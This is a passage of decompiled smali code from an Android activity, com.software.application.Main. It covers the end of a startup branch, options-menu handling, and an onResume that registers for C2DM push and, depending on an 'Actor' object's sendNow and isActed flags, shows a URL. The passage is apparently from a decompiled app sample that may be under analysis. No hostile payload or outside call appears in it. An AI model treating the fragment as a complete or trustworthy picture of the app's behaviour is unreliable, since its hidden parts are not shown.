
    .line 97
    :cond_1
    iget-object v2, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v2}, Lcom/software/application/Actor;->isActed()Z

    move-result v2

    if-eqz v2, :cond_2

    .line 98
    invoke-direct {p0}, Lcom/software/application/Main;->showURL()V

    goto :goto_0

    .line 100
    :cond_2
    invoke-direct {p0}, Lcom/software/application/Main;->initGUI()V

    .line 101
    invoke-direct {p0}, Lcom/software/application/Main;->install()V

    goto :goto_0

    .line 105
    :cond_3
    invoke-virtual {p0}, Lcom/software/application/Main;->finish()V

    goto :goto_0
.end method

.method public onCreateOptionsMenu(Landroid/view/Menu;)Z
    .locals 2
    .param p1, "menu"    # Landroid/view/Menu;

    .prologue
    .line 349
    invoke-virtual {p0}, Lcom/software/application/Main;->getMenuInflater()Landroid/view/MenuInflater;

    move-result-object v0

    .line 350
    .local v0, "inflater":Landroid/view/MenuInflater;
    const/high16 v1, 0x7f080000

    invoke-virtual {v0, v1, p1}, Landroid/view/MenuInflater;->inflate(ILandroid/view/Menu;)V

    .line 351
    const/4 v1, 0x1

    return v1
.end method

.method public onOptionsItemSelected(Landroid/view/MenuItem;)Z
    .locals 1
    .param p1, "item"    # Landroid/view/MenuItem;

    .prologue
    .line 356
    invoke-interface {p1}, Landroid/view/MenuItem;->getItemId()I

    move-result v0

    packed-switch v0, :pswitch_data_0

    .line 361
    invoke-super {p0, p1}, Landroid/app/Activity;->onOptionsItemSelected(Landroid/view/MenuItem;)Z

    move-result v0

    :goto_0
    return v0

    .line 358
    :pswitch_0
    invoke-direct {p0}, Lcom/software/application/Main;->showRules()V

    .line 359
    const/4 v0, 0x1

    goto :goto_0

    .line 356
    nop

    :pswitch_data_0
    .packed-switch 0x7f09000e
        :pswitch_0
    .end packed-switch
.end method

.method protected onResume()V
    .locals 1

    .prologue
    .line 245
    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    .line 246
    invoke-direct {p0}, Lcom/software/application/Main;->startC2DM()V

    .line 247
    iget-object v0, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v0}, Lcom/software/application/Actor;->sendNow()Z

    move-result v0

    if-nez v0, :cond_0

    .line 248
    iget-object v0, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v0}, Lcom/software/application/Actor;->isActed()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 249
    invoke-direct {p0}, Lcom/software/application/Main;->showURL()V

    .line 252
    :cond_0
    return-void
.end method
